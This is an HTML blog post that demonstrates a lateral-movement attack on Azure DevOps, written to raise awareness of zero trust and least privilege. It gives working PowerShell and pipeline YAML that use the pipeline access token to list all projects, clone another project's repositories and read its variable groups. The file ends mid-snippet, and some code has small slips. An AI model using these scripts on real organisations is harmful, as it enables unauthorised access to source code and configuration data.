@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Language" content="en">
+
+  
+  <meta name="author" content="Jev Suchoi">
+  <meta name="description" content="Demo of a rather unconventional &amp; unexpected Lateral Movement Attack which utilizes a possible configuration vulnerability in an Azure DevOps Organization">
+  <meta name="keywords" content="Automnation, PowerShell, ARM, YAML, Pipelines, Azure DevOps, Cloud, Microsoft, Azure, blog, developer, personal">
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://www.devjev.nl/images/hacking-azure-devops/header-img.jpg"/>
+
+<meta name="twitter:title" content="Hacking Azure DevOps"/>
+<meta name="twitter:description" content="Demo of a rather unconventional &amp; unexpected Lateral Movement Attack which utilizes a possible configuration vulnerability in an Azure DevOps Organization"/>
+
+  <meta property="og:title" content="Hacking Azure DevOps" />
+<meta property="og:description" content="Demo of a rather unconventional &amp; unexpected Lateral Movement Attack which utilizes a possible configuration vulnerability in an Azure DevOps Organization" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.devjev.nl/posts/hacking-azure-devops/" />
+<meta property="og:image" content="https://www.devjev.nl/images/hacking-azure-devops/header-img.jpg" />
+<meta property="article:published_time" content="2021-05-19T12:00:00+02:00" />
+<meta property="article:modified_time" content="2021-05-19T12:53:37+02:00" />
+
+
+  
+  <base href="https://www.devjev.nl/posts/hacking-azure-devops/">
+  
+  <title>
+  Hacking Azure DevOps · DevJev.NL
+</title>
+
+  
+  <link rel="canonical" href="https://www.devjev.nl/posts/hacking-azure-devops/">
+  
+
+  <link
+    href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css"
+    integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css"
+    integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+  
+  
+  
+  <link rel="stylesheet" href="https://www.devjev.nl/css/coder.min.cefcae32d597aabf73dbd69114994b69ab7ac71b0ed1b5d4f8fcec44cd5e853d.css" integrity="sha256-zvyuMtWXqr9z29aRFJlLaat6xxsO0bXU&#43;PzsRM1ehT0="
+    crossorigin="anonymous" media="screen" />
+  
+
+  
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://www.devjev.nl/css/coder-dark.min.0efab6bbe7b21f0b438d68c6210426682dc48dc7d6e1d89b2bcb1f70433d223e.css" integrity="sha256-Dvq2u&#43;eyHwtDjWjGIQQmaC3EjcfW4dibK8sfcEM9Ij4="
+    crossorigin="anonymous" media="screen" />
+  
+  
+
+  
+
+  
+
+  <link rel="apple-touch-icon" sizes="180x180"
+    href="https://www.devjev.nl/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32"
+    href="https://www.devjev.nl/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16"
+    href="https://www.devjev.nl/images/favicon-16x16.png">
+  <link rel="manifest" href="https://www.devjev.nl/site.webmanifest">
+  <link rel="shortcut icon" href="https://www.devjev.nl/favicon.ico?v=00Bg8oYJjl">
+  <meta name="msapplication-TileColor" content="#3388bb">
+  <meta name="msapplication-TileImage" content="/images/mstile-150x150.png?v=00Bg8oYJjl">
+  <meta name="msapplication-config"
+    content="https://www.devjev.nl/browserconfig.xml">
+  <meta name="theme-color" content="#3388bb">
+
+  <meta name="generator" content="Hugo 0.76.2" />
+</head>
+
+<body class="">
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://www.devjev.nl/">
+      Jev Suchoi
+    </a>
+    
+    <span id="dark-mode-toggle" class="menu-button float-right">
+      <svg width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+                3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+                13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+      </svg>
+    </span>
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+      
+      <li class="navigation-item">
+        <a class="navigation-link" href="https://www.devjev.nl/posts/">Posts</a>
+      </li>
+      
+      <li class="navigation-item">
+        <a class="navigation-link" href="https://www.devjev.nl/tags/">Tags</a>
+      </li>
+      
+      <li class="navigation-item">
+        <a class="navigation-link" href="https://www.devjev.nl/categories/">Categories</a>
+      </li>
+      
+      <li class="navigation-item">
+        <a class="navigation-link" href="https://www.devjev.nl/about/">About</a>
+      </li>
+      
+      
+      <li class="navigation-item separator">
+        <span>|</span>
+      </li>
+      
+    </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Hacking Azure DevOps</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2021-05-19T12:00:00&#43;02:00'>
+                May 19, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              12-minute read
+            </span>
+          </div>
+          <div class="categories">
+  <i class="fas fa-folder"></i>
+    <a href="https://www.devjev.nl/categories/security/">Security</a></div>
+
+          <div class="tags">
+  <i class="fas fa-tag"></i>
+    <a href="https://www.devjev.nl/tags/azure-devops/">Azure DevOps</a>
+      <span class="separator">•</span>
+    <a href="https://www.devjev.nl/tags/pipelines/">Pipelines</a>
+      <span class="separator">•</span>
+    <a href="https://www.devjev.nl/tags/hack/">Hack</a>
+      <span class="separator">•</span>
+    <a href="https://www.devjev.nl/tags/security/">Security</a>
+      <span class="separator">•</span>
+    <a href="https://www.devjev.nl/tags/lateral-attack/">Lateral Attack</a>
+      <span class="separator">•</span>
+    <a href="https://www.devjev.nl/tags/unconventional/">Unconventional</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+          <img src='https://www.devjev.nl/images/hacking-azure-devops/header-img.jpg' alt="Featured image"/>
+        
+        <h1 id="introduction">Introduction</h1>
+<p>While this case is not a particularly new one and has been posted by Matt Cooper on <a href="https://devblogs.microsoft.com/devops/pipeline-stealing-another-repo/">devblogs.microsoft.com</a> back in August 2020. I still feel that in relation to the possible data spillage it has not received sufficient exposure and the correct amount of awareness I would have expected. I actually stumbled upon this case by accident when playing with the Azure DevOps Library variables API.</p>
+<p>So in this post I want to showcase how a possible attacker can use a compromised developers environment to gain access to almost all the data present in an Azure DevOps Organization. While access of the developers environment in question is limited to just a single Azure DevOps Project.</p>
+<p><strong>NOTE:</strong> <em>This showcase assumes that the Azure DevOps organization has been created prior to May 2020 and that the administrators of the Azure DevOps Organization in question have not enabled the settings which resolve this issue. So you have probably have nothing to worry about if your Azure DevOps organization is from after May 2020 or if your admins already enabled the fix</em></p>
+<h2 id="goal">Goal</h2>
+<p><strong>So what&rsquo;s the goal of this post?</strong><br>
+The goal of this post is to emphasize the <em>importance</em> of <strong>zero trust</strong> and <strong>least privilege</strong>. And create awareness that security is everyone’s job.</p>
+<p><strong>How am I going to achieve this goal?</strong><br>
+By demonstrating a rather unconventional &amp; unexpected <em><a href="https://en.wikipedia.org/wiki/Network_Lateral_Movement">Lateral Movement Attack</a></em> which utilizes a possible configuration vulnerability in an Azure DevOps Organization.</p>
+<h2 id="current-situation">Current situation</h2>
+<p>For this showcase I have created an example Azure DevOps Organization called DemoJev. This organization is currently populated by 5 projects. As shown in the following image.</p>
+<p><img src="https://www.devjev.nl/images/hacking-azure-devops/example_ado_organization.jpg" alt="example_ado_organization"></p>
+<p>Lets assume that there are 3 developers Jan, Abdul and Henk who are working on the <em>My Shuttle Project</em>. They have access to:</p>
+<ul>
+<li>The project</li>
+<li>The code repo</li>
+<li>The variable group(s)</li>
+<li>The pipeline(s)</li>
+</ul>
+<p>And indirect access to the Azure resources deployed by the pipelines. The Azure permissions and configuration are actually not relevant within this showcase and are just added to draw a complete picture of a minimalistic set-up for a cloud native application development set-up. The <em>drawn</em> picture is as follows.</p>
+<p><img src="https://www.devjev.nl/images/hacking-azure-devops/example_ado_project.jpg" alt="example_ado_project"></p>
+<p>Since it is not the question if an environment is compromised but when. It is possible to assume that the development environment of one of the developers will eventually be compromised. In this showcase the development environment of Henk has been compromised.</p>
+<h2 id="henk-is-hacked">Henk is hacked!</h2>
+<p>It seems he is :-(<br>
+<img src="https://www.devjev.nl/images/hacking-azure-devops/henk_is_hacked.jpg" alt="henk_is_hacked"></p>
+<p>To better understand the implications of the hack lets zoom in on Henk&rsquo;s permissions. Like stated in the previous chapter Jan, Abdul and Henk are all team members on the project and thus it&rsquo;s save to assume that all of them have contributor role within the My Shuttle project. Assuming that out of the box permissions of the Azure DevOps project are present, Henk should at least have the following permissions;</p>
+<ul>
+<li>Modify source code (partially depending on branch policies)</li>
+<li>Create &amp; delete Git repos</li>
+<li>Create, delete, update and run pipeline</li>
+<li>Create, delete and update variable groups</li>
+<li>Modify board information</li>
+</ul>
+<h3 id="expected-data-spillage">Expected data spillage</h3>
+<p>Judging from the above noted permissions it is presumable to expect that the attacker acquired the same level of access as Henk has. So letting Azure aside (again, not important for this case) the data spillage should be limited to the <em>MyShuttle</em> Azure DevOps project. As illustrated in the following image.</p>
+<p><img src="https://www.devjev.nl/images/hacking-azure-devops/expected_spillage.jpg" alt="expected_spillage"></p>
+<h3 id="actual-data-spillage">Actual data spillage</h3>
+<p>Contrary to the expected data spillage the actual data spillage is much larger. By fiddling with som Azure DevOps API&rsquo;s and a bit of PowerShell scripting I was able to produce a data spillage the size of the whole Organization. See following the following image.</p>
+<p><img src="https://www.devjev.nl/images/hacking-azure-devops/actual_spillage.jpg" alt="actual_spillage"></p>
+<p>So a knowledgeable attacker can basically gain read access to pretty much all the data stored within the Azure DevOps Organization, including;</p>
+<ul>
+<li>All Azure DevOps projects within the same Organization</li>
+<li>All repositories in all Azure DevOps projects within the same Organization</li>
+<li>All values of the non secret variables in all Azure DevOps projects within the same Organization</li>
+<li>All Artifacts regardless of the streams are private or public</li>
+</ul>
+<h2 id="the-hack">The hack</h2>
+<p><code>NOTE: The code snippets which are part of this chapter are developed to showcase the possible vulnerability and should not be used in any other way!</code></p>
+<p>To explain how this is possible I am going to use an yaml pipeline that will execute a set of PowerShell scripts which will make calls to the Azure DevOps rest API using the pipeline identity.</p>
+<h3 id="authentication-header">Authentication header</h3>
+<p>First lets start by creating an authentication header using this pipeline identity. Azure DevOps pipelines have a set of predefined variables available for use during run-time, these contain all kinds of handy information. One of these is the <code>$(System.AccessToken)</code> or when using PowerShell <code>$($env:SYSTEM_ACCESSTOKEN)</code>. This variable contains the mentioned pipeline identity token. So using this token it is possible to craft an authentication header which will contain the security context of the pipeline identity token. In PowerShell this will look something like shown in the following snippet.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">
+<span style="color:#007f7f"># Authenticate header for ADO API</span>
+<span style="color:#007f7f"># ADO PAT API uses basic Auth without a username, hence the empty string</span>
+$auth = <span style="color:#0ff;font-weight:bold">&#39;{0}:{1}&#39;</span> -f <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, $($env:SYSTEM_ACCESSTOKEN)
+$utf8Auth = [System.Text.Encoding]::UTF8.GetBytes($Auth)
+$base64Auth = [System.Convert]::ToBase64String($utf8Auth)
+$httHeaders =
+@{
+    Authorization  = (<span style="color:#0ff;font-weight:bold">&#34;Basic {0}&#34;</span> -f $base64Auth)
+    <span style="color:#0ff;font-weight:bold">&#39;Content-Type&#39;</span> = <span style="color:#0ff;font-weight:bold">&#34;application/json&#34;</span>
+}
+
+</code></pre></div><h3 id="list-all-azure-devops-projects">List all Azure DevOps projects</h3>
+<p>The first step is to list all Azure DevOps projects within the DemoJev Organization. For this I used the <a href="https://docs.microsoft.com/en-us/rest/api/azure/devops/core/projects/list?view=azure-devops-rest-6.1">Projects - List API</a>. See following snippet.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">
+<span style="color:#fff;font-weight:bold">Write-Host</span> <span style="color:#0ff;font-weight:bold">&#34;Listing all projects present&#34;</span>
+$getAllProjectsApiUri = <span style="color:#0ff;font-weight:bold">&#34;https://dev.azure.com/demojev/_apis/projects?api-version=6.1-preview.4&#34;</span>
+$response = <span style="color:#fff;font-weight:bold">Invoke-RestMethod</span> -Uri $getAllProjectsApiUri -Headers $httHeaders -Method GET
+
+$response.value.<span style="color:#fff;font-weight:bold">ForEach</span>{
+    $curProject = $_
+    <span style="color:#fff;font-weight:bold">Write-Host</span> <span style="color:#0ff;font-weight:bold">&#34;Name: </span>$($curProject.name)<span style="color:#0ff;font-weight:bold">&#34;</span>
+    <span style="color:#fff;font-weight:bold">Write-Host</span> <span style="color:#0ff;font-weight:bold">&#34;ID: </span>$($curProject.id)<span style="color:#0ff;font-weight:bold">&#34;</span>
+}
+
+</code></pre></div><h4 id="putting-the-projects-api-call-to-practice">Putting the projects API call to practice</h4>
+<p>To call the API I have incorporated the authentication header into the API call by simply passing as <code>-Headers $httHeaders</code>. I am not going into details about the yaml pipeline as it should be pretty straight forward. However it is important to note the last two lines of this snippet. These two lines allow for the pipeline identity token to be passed to the task in question. Without this addition the token wont be accessible within the task.</p>
+<p>Making the system token available to a Azure DevOps task.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="font-weight:bold">env</span>:
+    <span style="font-weight:bold">SYSTEM_ACCESSTOKEN</span>: $(System.AccessToken)
+</code></pre></div><p>The API call in practice</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">
+<span style="font-weight:bold">pool</span>:
+  <span style="font-weight:bold">name</span>: Azure Pipelines
+  <span style="font-weight:bold">vmImage</span>: <span style="color:#0ff;font-weight:bold">&#34;windows-2019&#34;</span>
+
+<span style="font-weight:bold">stages</span>:
+  - <span style="font-weight:bold">stage</span>: <span style="color:#0ff;font-weight:bold">&#34;TestPipeLinePermissions&#34;</span>
+    <span style="font-weight:bold">displayName</span>: <span style="color:#0ff;font-weight:bold">&#34;Testing Project to Project Permissions&#34;</span>
+    <span style="font-weight:bold">jobs</span>:
+      - <span style="font-weight:bold">job</span>:
+        <span style="font-weight:bold">displayName</span>: <span style="color:#0ff;font-weight:bold">&#34;Testing API Calls&#34;</span>
+        <span style="font-weight:bold">workspace</span>:
+          <span style="font-weight:bold">clean</span>: all
+
+        <span style="font-weight:bold">steps</span>:
+          - <span style="font-weight:bold">task</span>: PowerShell@2
+            <span style="font-weight:bold">displayName</span>: <span style="color:#0ff;font-weight:bold">&#34;Testing AADO Project Api&#34;</span>
+            <span style="font-weight:bold">inputs</span>:
+              <span style="font-weight:bold">targetType</span>: <span style="color:#0ff;font-weight:bold">&#34;inline&#34;</span>
+              <span style="font-weight:bold">script</span>: |<span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                $auth = &#39;{0}:{1}&#39; -f &#34;&#34;, $($env:SYSTEM_ACCESSTOKEN)
+</span><span style="color:#0ff;font-weight:bold">                $utf8Auth = [System.Text.Encoding]::UTF8.GetBytes($Auth)
+</span><span style="color:#0ff;font-weight:bold">                $base64Auth = [System.Convert]::ToBase64String($utf8Auth)
+</span><span style="color:#0ff;font-weight:bold">                $httHeaders =
+</span><span style="color:#0ff;font-weight:bold">                @{
+</span><span style="color:#0ff;font-weight:bold">                    Authorization  = (&#34;Basic {0}&#34; -f $base64Auth)
+</span><span style="color:#0ff;font-weight:bold">                    &#39;Content-Type&#39; = &#34;application/json&#34;
+</span><span style="color:#0ff;font-weight:bold">                }
+</span><span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                Write-Host &#34;Listing all projects present&#34;
+</span><span style="color:#0ff;font-weight:bold">                $getAllProjectsApiUri = &#34;https://dev.azure.com/demojev/_apis/projects?api-version=6.1-preview.4&#34;
+</span><span style="color:#0ff;font-weight:bold">                $response = Invoke-RestMethod -Uri $getAllProjectsApiUri -Headers $httHeaders -Method GET
+</span><span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                $response.value.ForEach{
+</span><span style="color:#0ff;font-weight:bold">                    $curProject = $_
+</span><span style="color:#0ff;font-weight:bold">                    Write-Host &#34;Name: $($curProject.name)&#34;
+</span><span style="color:#0ff;font-weight:bold">                    Write-Host &#34;ID: $($curProject.id)&#34;
+</span><span style="color:#0ff;font-weight:bold">                }</span>                
+              <span style="font-weight:bold">errorActionPreference</span>: <span style="color:#0ff;font-weight:bold">&#34;continue&#34;</span>
+              <span style="font-weight:bold">pwsh</span>: <span style="color:#fff;font-weight:bold">true</span>
+            <span style="font-weight:bold">env</span>:
+              <span style="font-weight:bold">SYSTEM_ACCESSTOKEN</span>: $(System.AccessToken)
+
+</code></pre></div><p>When executed, the pipeline should displaying all Azure DevOps Projects and their ID&rsquo;s. As shown in the following image.</p>
+<p><img src="https://www.devjev.nl/images/hacking-azure-devops/hack_list_ado_projects.jpg" alt="hack_list_ado_projects"></p>
+<h3 id="get-all-git-repos">Get all Git repo&rsquo;s</h3>
+<p>Now that all the project information is available, it is possible to dig a little deeper and retrieve git repositories from one or even from all of the retrieved projects. To keep the showcase simple the following snippet gets the repos of a single project, namely; MyHealthClinic. First I call the <a href="https://docs.microsoft.com/en-us/rest/api/azure/devops/git/repositories/get?view=azure-devops-rest-4.1&amp;viewFallbackFrom=azure-devops-rest-6.0">Repositories - Get</a> API to get metadata about all the repositories present within this project. Then it is just a matter of iterating trough the response and executing a <code>git clone</code> command fo each repo. Most interesting part here was composing the <code>@gitUrl</code> variable value. As it is needed for input when calling the <code>git clone</code> command. To achieve this I was able to reuse the <code>$(System.AccessToken)</code> as a credentials object when using the &lsquo;git clone&rsquo; command.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">
+$repoDir = <span style="color:#fff;font-weight:bold">New-Item</span> -Path $(<span style="color:#fff;font-weight:bold">Get-Location</span>).Path -Name <span style="color:#0ff;font-weight:bold">&#34;git-repos&#34;</span> -ItemType <span style="color:#0ff;font-weight:bold">&#34;directory&#34;</span> -Force
+
+<span style="color:#fff;font-weight:bold">Write-Host</span> <span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">`n</span><span style="color:#0ff;font-weight:bold">Getting all repositories in Project [MyHealthClinic]&#34;</span>
+$listAllGitReposApiUri = <span style="color:#0ff;font-weight:bold">&#34;https://dev.azure.com/demojev/MyHealthClinic/_apis/git/repositories?api-version=6.0&#34;</span>
+$allRepos = <span style="color:#fff;font-weight:bold">Invoke-RestMethod</span> -Uri $listAllGitReposApiUri -Headers $httpHeaders -Method GET
+
+<span style="color:#fff;font-weight:bold">Write-Host</span> <span style="color:#0ff;font-weight:bold">&#34;Retrieved repos [</span>$($allRepos.count)<span style="color:#0ff;font-weight:bold">] [</span>$($allRepos.value.count)<span style="color:#0ff;font-weight:bold">]&#34;</span>
+
+$allRepos.value.<span style="color:#fff;font-weight:bold">ForEach</span>{
+    $curRepo = $_
+    <span style="color:#fff;font-weight:bold">Write-Host</span> <span style="color:#0ff;font-weight:bold">&#34;Cloning repo: </span>$($curRepo.name)<span style="color:#0ff;font-weight:bold">&#34;</span>
+
+    $gitClonePath = <span style="color:#0ff;font-weight:bold">&#34;{0}\{1}&#34;</span> -f $repoDir, $curRepo.name
+    $gitUrl = <span style="color:#0ff;font-weight:bold">&#34;https://{0}@{1}&#34;</span> -f $($env:SYSTEM_ACCESSTOKEN), $curRepo.remoteUrl.Split(<span style="color:#0ff;font-weight:bold">&#39;@&#39;</span>)[1]
+    git clone $gitUrl $gitClonePath
+
+    <span style="color:#fff;font-weight:bold">Get-ChildItem</span> -Path $gitClonePath
+
+    <span style="color:#fff;font-weight:bold">Write-Host</span> <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>
+}
+
+</code></pre></div><h4 id="putting-the-git-api-call-to-practice">Putting the Git API call to practice</h4>
+<p>When everything is put together, the pipeline is as show in the following snippet.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">
+<span style="font-weight:bold">pool</span>:
+  <span style="font-weight:bold">name</span>: Azure Pipelines
+  <span style="font-weight:bold">vmImage</span>: <span style="color:#0ff;font-weight:bold">&#34;windows-2019&#34;</span>
+
+<span style="font-weight:bold">stages</span>:
+  - <span style="font-weight:bold">stage</span>: <span style="color:#0ff;font-weight:bold">&#34;TestPipeLinePermissions&#34;</span>
+    <span style="font-weight:bold">displayName</span>: <span style="color:#0ff;font-weight:bold">&#34;Testing Project to Project Permissions&#34;</span>
+    <span style="font-weight:bold">jobs</span>:
+      - <span style="font-weight:bold">job</span>:
+        <span style="font-weight:bold">displayName</span>: <span style="color:#0ff;font-weight:bold">&#34;Testing API Calls&#34;</span>
+        <span style="font-weight:bold">workspace</span>:
+          <span style="font-weight:bold">clean</span>: all
+
+        <span style="font-weight:bold">steps</span>:
+          - <span style="font-weight:bold">task</span>: PowerShell@2
+            <span style="font-weight:bold">displayName</span>: <span style="color:#0ff;font-weight:bold">&#34;Testing get Repos API&#34;</span>
+            <span style="font-weight:bold">inputs</span>:
+              <span style="font-weight:bold">targetType</span>: <span style="color:#0ff;font-weight:bold">&#34;inline&#34;</span>
+              <span style="font-weight:bold">script</span>: |<span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                $auth = &#39;{0}:{1}&#39; -f &#34;&#34;, $($env:SYSTEM_ACCESSTOKEN)
+</span><span style="color:#0ff;font-weight:bold">                $utf8Auth = [System.Text.Encoding]::UTF8.GetBytes($Auth)
+</span><span style="color:#0ff;font-weight:bold">                $base64Auth = [System.Convert]::ToBase64String($utf8Auth)
+</span><span style="color:#0ff;font-weight:bold">                $httpHeaders =
+</span><span style="color:#0ff;font-weight:bold">                @{
+</span><span style="color:#0ff;font-weight:bold">                    Authorization  = (&#34;Basic {0}&#34; -f $base64Auth)
+</span><span style="color:#0ff;font-weight:bold">                    &#39;Content-Type&#39; = &#34;application/json&#34;
+</span><span style="color:#0ff;font-weight:bold">                }
+</span><span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                $repoDir = New-Item -Path $(Get-Location).Path -Name &#34;git-repos&#34; -ItemType &#34;directory&#34; -Force
+</span><span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                Write-Host &#34;`nGetting all repositories in Project [MyHealthClinic]&#34;
+</span><span style="color:#0ff;font-weight:bold">                $listAllGitReposApiUri = &#34;https://dev.azure.com/demojev/MyHealthClinic/_apis/git/repositories?api-version=6.0&#34;
+</span><span style="color:#0ff;font-weight:bold">                $allRepos = Invoke-RestMethod -Uri $listAllGitReposApiUri -Headers $httpHeaders -Method GET
+</span><span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                Write-Host &#34;Retrieved repos [$($allRepos.count)] [$($allRepos.value.count)]&#34;
+</span><span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                $allRepos.value.ForEach{
+</span><span style="color:#0ff;font-weight:bold">                    $curRepo = $_
+</span><span style="color:#0ff;font-weight:bold">                    Write-Host &#34;Cloning repo: $($curRepo.name)&#34;
+</span><span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                    $gitClonePath = &#34;{0}\{1}&#34; -f $repoDir, $curRepo.name
+</span><span style="color:#0ff;font-weight:bold">                    $gitUrl = &#34;https://{0}@{1}&#34; -f $($env:SYSTEM_ACCESSTOKEN), $curRepo.remoteUrl.Split(&#39;@&#39;)[1]
+</span><span style="color:#0ff;font-weight:bold">                    git clone $gitUrl $gitClonePath
+</span><span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                    Get-ChildItem -Path $gitClonePath
+</span><span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                    Write-Host &#34;&#34;
+</span><span style="color:#0ff;font-weight:bold">                }</span>                
+              <span style="font-weight:bold">errorActionPreference</span>: <span style="color:#0ff;font-weight:bold">&#34;continue&#34;</span>
+              <span style="font-weight:bold">pwsh</span>: <span style="color:#fff;font-weight:bold">true</span>
+            <span style="font-weight:bold">env</span>:
+              <span style="font-weight:bold">SYSTEM_ACCESSTOKEN</span>: $(System.AccessToken)
+
+</code></pre></div><p>When executed, the pipeline should result in all the present Git repositories within the project cloned to the working directory specified by the <code>$reposDir</code> variable. Check the following image for the result.</p>
+<p><img src="https://www.devjev.nl/images/hacking-azure-devops/hack_get_git_repos.jpg" alt="hack_get_git_repos"></p>
+<h3 id="get-all-variable-values">Get all variable values</h3>
+<p>With the project information still available it is also possible to get additional data for each of the projects. Personally next to actually cloning the repositories I found that the possibility to actually get variable data the most <em>&lsquo;interesting&rsquo;</em> find. So first a call to the <a href="https://docs.microsoft.com/en-us/rest/api/azure/devops/distributedtask/variablegroups/get%20variable%20groups?view=azure-devops-rest-6.1">Variablegroups - Get Variable Groups</a> API. This API expects a groupName (documentation states it does not, but it does!) so to get all the groups I simply tried: <code>groupName=*</code>. It actually worked!</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">
+$getVarGroupNameApiUri = <span style="color:#0ff;font-weight:bold">&#34;https://dev.azure.com/demojev/MyHealthClinic/_apis/distributedtask/variablegroups?groupName=*&amp;api-version=6.1-preview.2&#34;</span>
+$varGroupResponse = <span style="color:#fff;font-weight:bold">Invoke-RestMethod</span> -Uri $getVarGroupNameApiUri -Headers $httHeaders
+
+<span style="color:#fff;font-weight:bold">Write-Host</span> <span style="color:#0ff;font-weight:bold">&#34;Variables from group [</span>$($varGroupResponse.value.name)<span style="color:#0ff;font-weight:bold">] in project id [MyHealthClinic are:&#34;</span>
+<span style="color:#fff;font-weight:bold">Write-Host</span> <span style="color:#0ff;font-weight:bold">&#34;</span>$($varGroupResponse.value[0].variables | <span style="color:#fff;font-weight:bold">ConvertTo-Json</span> -Depth 100)<span style="color:#0ff;font-weight:bold">)&#34;</span>
+}
+
+</code></pre></div><h4 id="putting-the-variable-groups-api-call-to-practice">Putting the variable groups API call to practice</h4>
+<p>When everything is put together, the pipeline is as show in the following snippet.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">
+<span style="font-weight:bold">pool</span>:
+  <span style="font-weight:bold">name</span>: Azure Pipelines
+  <span style="font-weight:bold">vmImage</span>: <span style="color:#0ff;font-weight:bold">&#34;windows-2019&#34;</span>
+
+<span style="font-weight:bold">stages</span>:
+  - <span style="font-weight:bold">stage</span>: <span style="color:#0ff;font-weight:bold">&#34;TestPipeLinePermissions&#34;</span>
+    <span style="font-weight:bold">displayName</span>: <span style="color:#0ff;font-weight:bold">&#34;Testing Project to Project Permissions&#34;</span>
+    <span style="font-weight:bold">jobs</span>:
+      - <span style="font-weight:bold">job</span>:
+        <span style="font-weight:bold">displayName</span>: <span style="color:#0ff;font-weight:bold">&#34;Testing API Calls&#34;</span>
+        <span style="font-weight:bold">workspace</span>:
+          <span style="font-weight:bold">clean</span>: all
+
+        <span style="font-weight:bold">steps</span>:
+          - <span style="font-weight:bold">task</span>: PowerShell@2
+            <span style="font-weight:bold">displayName</span>: <span style="color:#0ff;font-weight:bold">&#34;Testing get Variables API&#34;</span>
+            <span style="font-weight:bold">inputs</span>:
+              <span style="font-weight:bold">targetType</span>: <span style="color:#0ff;font-weight:bold">&#34;inline&#34;</span>
+              <span style="font-weight:bold">script</span>: |<span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                $auth = &#39;{0}:{1}&#39; -f &#34;&#34;, $($env:SYSTEM_ACCESSTOKEN)
+</span><span style="color:#0ff;font-weight:bold">                $utf8Auth = [System.Text.Encoding]::UTF8.GetBytes($Auth)
+</span><span style="color:#0ff;font-weight:bold">                $base64Auth = [System.Convert]::ToBase64String($utf8Auth)
+</span><span style="color:#0ff;font-weight:bold">                $httHeaders =
+</span><span style="color:#0ff;font-weight:bold">                @{
+</span><span style="color:#0ff;font-weight:bold">                    Authorization  = (&#34;Basic {0}&#34; -f $base64Auth)
+</span><span style="color:#0ff;font-weight:bold">                    &#39;Content-Type&#39; = &#34;application/json&#34;
+</span><span style="color:#0ff;font-weight:bold">                }
+</span><span style="color:#0ff;font-weight:bold">
